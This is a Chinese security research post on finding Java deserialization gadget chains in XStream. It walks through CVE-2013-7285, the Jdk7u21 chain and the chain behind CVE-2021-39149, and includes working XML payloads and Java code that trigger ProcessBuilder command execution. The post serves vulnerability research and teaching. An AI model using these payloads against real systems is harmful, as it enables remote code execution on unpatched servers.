---
slug: tiangongarticle62
date: 2025-01-22
title: 从XStream浅析反序列化Gadget挖掘思路
author: yyhy
tags: ["java","xstream"]
---


### 0x01 前言

Java语言中最常见的一类漏洞就是反序列化漏洞，在各种数据格式到Java对象的转化过程中，常常存在这类漏洞。常见的数据类型例如jdk提供的原生序列化数据、json、yaml、xml等等。针对这类漏洞存在一种特别的漏洞挖掘方式—Gadget挖掘，这种漏洞挖掘不需要去寻找特定的外部入口漏洞入口，入口往往是公开的，应用通过对传入的数据内容进行过滤和检查。XStream是一款针对XML和Java对象转换而开发的工具库，由于其本身的一些特点，成为了这类漏洞挖掘里一个很典型的例子，因此本文针对XStream进行Gadget挖掘分析。本文更多的是分享Gadget挖掘时的思路，进而可以在其他类型的序列化中进行类似的思考和尝试。

### 0x02  XStream简介

XStream是一个常用的Java对象和XML相互转换的Java库。

从java对象到XML：

 ![](/attachments/2025-01-22-xstream-gadget/f0ee56c8-b2c4-42f6-a06c-2b08dee08312.png " =276.6666666666667x135.33333333333334")

 ![](/attachments/2025-01-22-xstream-gadget/69093f5c-68de-4317-9649-d3771036b428.png " =290x113.33333333333333")

从XML到Java对象：

 ![](/attachments/2025-01-22-xstream-gadget/c0795205-480b-4a02-86c1-f989ded0a96c.png " =276.6666666666667x137")

 ![](/attachments/2025-01-22-xstream-gadget/ffdac282-eb4b-4f70-9a4b-a1d6abaa7805.png " =413.6666666666667x115")

XStream在1.4.18版本以前是存在许多CVE的，核心原因在于的它使用类的黑名单进行防御，因此层出不穷的绕过，在1.4.18版本以后默认为白名单，用户需要自行根据需要使用的类进行配置，到这个版本XStream才没有继续爆出高危的反序列化漏洞。

 ![](/attachments/2025-01-22-xstream-gadget/15acccf3-dbc2-41cc-8ec0-2bf8c9d40c02.png)

值得一提的是，XStream中有CVE编号的利用链都是不依赖任何第三方库，纯利用JDK中的类进行利用，由此可见XStream对于反序列化的宽泛程度。

### 0x03 历史漏洞

简单介绍一下XStream反序列的特点。反序列化漏洞的本质是，基于可以利用的Java类：序列化数据流→Source→Gadget→Sink。

对于原生的Java反序列化来说，可以利用的Java类是任意实现了**Serializable**的类，入口是ObjectInputStream的readObject方法。

对于XStream来说，可以利用的Java是**任意类**，入口是XStream的fromXML方法。

以一个经典的CVE-2013-7285来说，poc如下，执行的sink是ProcessBuilder.start()

 ![](/attachments/2025-01-22-xstream-gadget/20c54f8b-4079-419f-8a88-4d1bfb7b6a8b.png " =508.6666666666667x285.3333333333333")

XStream中有一系列的Converter，用于对不同的标签进行转化。

 ![](/attachments/2025-01-22-xstream-gadget/34675d41-f370-4b5d-af6c-993219074a75.png)

这里sorted-set标签对应的是TreeSetConverter,它的代码逻辑中会调用TreeMap的put方法，而TreeMap的put方法会调用方法的compare方法对传入Map的对象进行判断对象应该存放的位置

```jsx
public V put(K key, V value) {
        ...
        // split comparator and comparable paths
        Comparator<? super K> cpr = comparator;
        if (cpr != null) {
            do {
                parent = t;
                cmp = cpr.compare(key, t.key);
                if (cmp < 0)
                    t = t.left;
                else if (cmp > 0)
                    t = t.right;
                else
                    return t.setValue(value);
            } while (t != null);
        }
        else {
            ...
        }
        Entry<K,V> e = new Entry<>(key, value, parent);
        if (cmp < 0)
            parent.left = e;
        else
            parent.right = e;
        fixAfterInsertion(e);
        size++;
        modCount++;
        return null;
    }
```

 ![](/attachments/2025-01-22-xstream-gadget/d196ba5f-5f12-4f46-80dc-30ac8f0fdb75.png)

这里传入的对象是一个动态代理java.beans.EventHandler对象。在 Java 中，动态代理对象是一种在运行时创建的代理对象，它实现了InvocationHandler接口的invoke方法，从而将方法调用按照动态代理的invoke的实现逻辑进行转发。

```jsx
public Object invoke(final Object proxy, final Method method, final Object[] arguments) {
    AccessControlContext acc = this.acc;
    if ((acc == null) && (System.getSecurityManager() != null)) {
        throw new SecurityException("AccessControlContext is not set");
    }
    return AccessController.doPrivileged(new PrivilegedAction<Object>() {
        public Object run() {
            return invokeInternal(proxy, method, arguments);
        }
    }, acc);
}

private Object invokeInternal(Object proxy, Method method, Object[] arguments) {
        String methodName = method.getName();
        if (method.getDeclaringClass() == Object.class)  {
            // Handle the Object public methods.
            if (methodName.equals("hashCode"))  {
                return new Integer(System.identityHashCode(proxy));
            } else if (methodName.equals("equals")) {
                return (proxy == arguments[0] ? Boolean.TRUE : Boolean.FALSE);
            } else if (methodName.equals("toString")) {
                return proxy.getClass().getName() + '@' + Integer.toHexString(proxy.hashCode());
            }
        }

        if (listenerMethodName == null || listenerMethodName.equals(methodName)) {
            try {
                int lastDot = action.lastIndexOf('.');
                if (lastDot != -1) {
                    target = applyGetters(target, action.substring(0, lastDot));
                    action = action.substring(lastDot + 1);
                }
                Method targetMethod = Statement.getMethod(
                             target.getClass(), action, argTypes);
                if (targetMethod == null) {
                    ...
                }
                return MethodUtil.invoke(targetMethod, target, newArgs);
            }
            catch (IllegalAccessException ex) {
                throw new RuntimeException(ex);
            }
            catch (InvocationTargetException ex) {
                Throwable th = ex.getTargetException();
                throw (th instanceof RuntimeException)
                        ? (RuntimeException) th
                        : new RuntimeException(th);
            }
        }
        return null;
    }
```

它的特点是会在执行非hashCode、equals以及toString这些方法时，会执行其target属性的对象及指定方法。因此在执行到这个动态代理对象的compare方法时，它实际上会执行其target属性ProcessBuilder的start方法，也就是任意命令执行。

XStream对于此漏洞的补丁也很简单，默认禁用了java.beans.EventHandler这个动态代理类

 ![](/attachments/2025-01-22-xstream-gadget/45124218-173b-407e-9389-0c4d70a9beed.png)

### 0x04 Gadget挖掘思路

以这条链的禁用进行思考新链的挖掘方式，java.beans.EventHandler这个动态代理类被禁，那么是否存在其他动态代理类，也具有这样的这样可以执行任意方法的类，毕竟动态代理类本身设计就是用来在一个方法调用时，定向调用其他的方法，如果invoke方法中对传入方法或者类检测不严格，那么就很容易产生任意方法执行，并且jdk中有非常多的动态代理实现，因此可以尝试挖掘。

把jdk的类利用tabby生成图，执行如下语句

```jsx
MATCH path=(sink:Method {IS_SINK: true, NAME: "invoke"})<-[:CALL|ALIAS*1..2]-(source:Method)<-[:HAS]-(child:Class)-[:EXTENDS|INTERFACE*]->(father:Class)
WHERE father.NAME = "java.lang.reflect.InvocationHandler" and source.NAME="invoke" and not source.CLASSNAME contains "com.sun.org.glassfish"
RETURN child.NAME;
```

以动态代理类的实现类的invoke方法为source，可控的Method.invoke为sink，并且不包含com.sun.org.glassfish包中的类，因为这个包中存在多个实现类似的invoke方法，对传入类做了严格限制，无法利用，为了方便排查，屏蔽这个包的结果：

 ![](/attachments/2025-01-22-xstream-gadget/cbdea809-206e-4e5a-837f-73de4684bc1d.png)

一共存在12条链路。其中可以看到有一个sun.reflect.annotation.AnnotationInvocationHandler类。看过Java反序列化的同学一定认识这个类，因为这个类就是原生反序列化中很经典的一条利用链Jdk7u21。

 ![](/attachments/2025-01-22-xstream-gadget/12e87915-cfe8-4866-bae1-665b49b6ff5b.png)

而这里给出的链路其实就是Jdk7u21的利用链路，既然它在原生反序列化中可以使用，那么对于适用范围更广的XStream来说，也很有可能可以用。

验证起来也很简单，直接将jdk7u21生成的对象toXML，然后再调用fromXML，就会发现是可以触发代码执行的。

```jsx
String poc = xStream.toXML(new Jdk7u21().getObject("calc.exe"));
xStream.fromXML(poc);
```

生成的XML如下：

```jsx
<linked-hash-set>
  <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl serialization="custom">
    <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
      <default>
        <__indentNumber>0</__indentNumber>
        <__transletIndex>-1</__transletIndex>
        <__useServicesMechanism>false</__useServicesMechanism>
        <__bytecodes>
          <byte-array>xxx</byte-array>
          <byte-array>xxx</byte-array>
        </__bytecodes>
        <__name>Pwnr</__name>
      </default>
      <boolean>false</boolean>
    </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
  </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
  <dynamic-proxy>
    <interface>javax.xml.transform.Templates</interface>
    <handler class="sun.reflect.annotation.AnnotationInvocationHandler" serialization="custom">
      <sun.reflect.annotation.AnnotationInvocationHandler>
        <default>
          <memberValues>
            <entry>
              <string>f5a5a608</string>
              <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl reference="../../../../../../../com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"/>
            </entry>
          </memberValues>
          <type>javax.xml.transform.Templates</type>
        </default>
      </sun.reflect.annotation.AnnotationInvocationHandler>
    </handler>
  </dynamic-proxy>
</linked-hash-set>
```

从前面的分析可以知道这条链最终做到的是任意方法执行TemplatesImpl.getOutputProperties方法进行字节码加载。当然这里也可以选择和CVE-2013-7285一样的ProcessBuilder.start，只需要把TemplatesImp标签替换为ProcessBuilder就可以了。

```jsx
  <java.lang.ProcessBuilder>
    <command>
      <string>calc.exe</string>
    </command>
  </java.lang.ProcessBuilder>
```

需要注意的是这条利用链的外层入口类不再是sorted-set标签，而是linked-hash-set，原因是这条链中用到的AnnotationInvocationHandler必须触发其equals方法才能进入equalsImpl，最终触发任意代码执行。

 ![](/attachments/2025-01-22-xstream-gadget/9a0b334a-bfde-4d25-bd42-7712227d0908.png)

AnnotationInvocationHandler和EventHandler的特性非常相似，那么Java原生反序列化链是否也可以使用EventHandler？答案是否定的，原因也很简单，就是前面提到的可以被反序列化的类的类型存在限制。

 ![](/attachments/2025-01-22-xstream-gadget/b7101a49-4f8c-4568-b239-3c68a56e2cdf.png)

 ![](/attachments/2025-01-22-xstream-gadget/686605d7-04fc-42aa-8c66-7361cff79d12.png)

当然这条利用链也和原生反序列化中一样，在高版本jdk被修复了，因此还是需要看之前分析结果中的其他链。分析剩下的几个类中的Method.invoke调用，会发现这些method都不可控或者无法利用，因此继续分析3层利用：

```jsx
MATCH path=(sink:Method {IS_SINK: true, NAME: "invoke"})<-[:CALL|ALIAS*3]-(source:Method)<-[:HAS]-(child:Class)-[:EXTENDS|INTERFACE*]->(father:Class)
WHERE father.NAME = "java.lang.reflect.InvocationHandler" and not source.CLASSNAME contains "com.sun.org.glassfish"
RETURN child.NAME;
```

虽然数量很多，但是链的起始点都是com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl

 ![](/attachments/2025-01-22-xstream-gadget/ec9b4c1f-6fb8-4559-bed6-f2e0e736a9c4.png)

而CompositeInvocationHandlerImpl其实就是一个动态代理的封装。

```jsx
public Object invoke( Object proxy, Method method, Object[] args )
    throws Throwable
{
    // Note that the declaring class in method is the interface
    // in which the method was defined, not the proxy class.
    Class cls = method.getDeclaringClass() ;
    InvocationHandler handler =
        (InvocationHandler)classToInvocationHandler.get( cls ) ;

    if (handler == null) {
        if (defaultHandler != null)
            handler = defaultHandler ;
        else {
            ORBUtilSystemException wrapper = ORBUtilSystemException.get(
                CORBALogDomains.UTIL ) ;
            throw wrapper.noInvocationHandler( "\"" + method.toString() +
                "\"" ) ;
        }
    }

    // handler should never be null here.

    return handler.invoke( proxy, method, args ) ;
}
```

因此继续分析4层调用。

可以看到此时出现了一个sun.tracing.ProviderSkeleton，并且浅看代码，在invoke中是没有过滤的。

 ![](/attachments/2025-01-22-xstream-gadget/55cbe1c5-e153-4e9c-b7b2-46c1b1acf429.png)

因此查看下这个类开始的链：

```jsx
MATCH path=(sink:Method {IS_SINK: true, NAME: "invoke"})<-[:CALL|ALIAS*4]-(source:Method)<-[:HAS]-(child:Class)-[:EXTENDS|INTERFACE*]->(father:Class)
WHERE father.NAME = "java.lang.reflect.InvocationHandler" and source.NAME="invoke" and not source.CLASSNAME contains "com.sun.org.glassfish"  and source.CLASSNAME="sun.tracing.ProviderSkeleton"
RETURN path;
```

 ![](/attachments/2025-01-22-xstream-gadget/975d3b84-c36e-4767-982c-8c4c2ad061b5.png)

invoke函数代码如下：

```jsx
 public Object invoke(Object var1, Method var2, Object[] var3) {
    Class var4 = var2.getDeclaringClass();
    if (var4 != this.providerType) {
        try {
            if (var4 != Provider.class && var4 != Object.class) {
                throw new SecurityException();
            }

            return var2.invoke(this, var3);
        } catch (IllegalAccessException var6) {
            assert false;
        } catch (InvocationTargetException var7) {
            assert false;
        }
    } else {
        this.triggerProbe(var2, var3);
    }

    return null;
}
```

可以看到上图中的两条链路对应的是var2.invoke和下方的triggerProbe，var2是动态代理的方法，因此是不可控的，仅剩的一条利用链调用如下：

```jsx
sun.tracing.ProviderSkeleton#invoke
		sun.tracing.ProbeSkeleton#uncheckedTrigger
					sun.tracing.dtrace.DTraceProbe#uncheckedTrigger
						this.implementing_method.invoke(this.proxy, var1);
```

这里的implementing_method和proxy都是DTraceProbe的属性，符合反序列化的要求，因此只需要按照需要构造出一个ProviderSkeleton对象就可以。构造的代码如下， 使用Unsafe构造对象可以避免生成很多用不到的属性，从而污染输出的xml。

```jsx
HashMap hashMap = new HashMap<Method, ProbeSkeleton>();
Method hashcode = Object.class.getDeclaredMethod("hashCode");
ProcessBuilder processBuilder = new ProcessBuilder("calc.exe");
Method start =processBuilder.getClass().getDeclaredMethod("start");

Object nullprovider = getUnsafe().allocateInstance(Class.forName("sun.tracing.NullProvider"));
Object probe = getUnsafe().allocateInstance(Class.forName("sun.tracing.dtrace.DTraceProbe"));
Reflections.setFieldValue(probe,"proxy",processBuilder);
Reflections.setFieldValue(probe,"implementing_method",start);

hashMap.put(hashcode,probe);
Reflections.setFieldValue(nullprovider,"providerType",Object.class);
Reflections.setFieldValue(nullprovider,"active",true);
Reflections.setFieldValue(nullprovider,"probes",hashMap);

Object a =  Proxy.newProxyInstance(
        nullprovider.getClass().getClassLoader(),
        new Class<?>[] { Comparable.class },
        (InvocationHandler) nullprovider);

XStream xstream = new XStream();
String poc = xstream.toXML(a);
System.out.println("<linked-hash-set>\n" +poc + "\n</linked-hash-set>");
```

对于生成出来的动态代理对象XML，只需要在最外层套用一层linkedhashset，即可在其实现中调用对象的hashCode方法，从而进入动态代理的invoke函数，最终触发任意方法执行。在本例中选择的是processBuilder.start，同样的也可以使用TemplatesImpl.getOutputProperties进行代码代码执行。事实上这就是XStream CVE-2021-39149的挖掘过程。

### 0x05 总结

就动态代理的利用来说，jdk已被挖掘的七七八八，XStream其他的公开利用链，基本上都基于CompareTo、toString、hashCode等方法进行展开，找到一些潜在的特定格式的特定参数可控的方法执行后，再进一步填入不同的类，进行漏洞的完整利用。这种寻找Gadget的方法在Weblogic、Websphere、Dubbo hessian等固定存在序列化入口，通过黑名单进行防御的漏洞挖掘种常常被用到，不同的只是对类的限制、要求不同，在看清真实的需求的情况下，利用自动化工具一步步寻找，就可以有效地进行Gadget挖掘。